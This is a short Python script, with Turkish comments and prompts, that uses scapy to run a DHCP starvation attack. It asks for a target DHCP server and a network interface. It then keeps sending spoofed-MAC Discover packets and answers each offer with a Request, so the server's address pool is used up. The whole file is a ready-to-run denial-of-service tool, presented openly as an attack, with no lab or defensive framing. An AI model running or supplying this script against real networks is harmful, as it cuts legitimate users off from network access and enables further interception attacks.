import signal
import sys
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP
import warnings
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

# Çıkış durumunu yönetmek için bir işaretçi
running = True

def handle_exit(signal, frame):
    global running
    print("\nSaldırı durduruldu. Çıkış yapılıyor...")
    running = False
    sys.exit(0)

# Çıkışı işlemek için sinyal işleyiciyi tanımla
signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)

def dhcp_discover(spoofed_mac, i_face):
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    dsc = Ether(src=spoofed_mac, dst=mac_dest)
    dsc /= IP(src='0.0.0.0', dst=ip_dest)
    dsc /= UDP(sport=68, dport=67)
    dsc /= BOOTP(chaddr=spoofed_mac, xid=random.randint(1, 1000000000), flags=0xFFFFFF)
    dsc /= DHCP(options=[("message-type", "discover"), "end"])
    sendp(dsc, iface=i_face)
    print("DHCP Discover gönderildi")

def dhcp_starvation(target_ip, i_face):
    server_mac = sr1(ARP(op=1, pdst=target_ip))[ARP].hwsrc
    mac = RandMAC()
    while running:
        dhcp_discover(spoofed_mac=mac, i_face=i_face)
        pkt = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3)
        if pkt and DHCP in pkt[0] and pkt[0][DHCP].options[0][1] == 2:
            ip = pkt[0][BOOTP].yiaddr
            dhcp_request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
            dhcp_request /= IP(src="0.0.0.0", dst='255.255.255.255')
            dhcp_request /= UDP(sport=68, dport=67)
            dhcp_request /= BOOTP(chaddr=mac, xid=random.randint(1, 1000000000))
            dhcp_request /= DHCP(options=[("message-type", "request"), ("server_id", target_ip), ("requested_addr", ip), "end"])
            sendp(dhcp_request, iface=i_face)
            print(f"{ip} için DHCP Request gönderildi")

if __name__ == "__main__":
    target_ip = input("Hedef DHCP sunucusunun IP adresini girin: ")
    iface = input("Saldırıyı gerçekleştireceğiniz ağ arayüzünü girin (örn. eth0): ")
    dhcp_starvation(target_ip, iface)
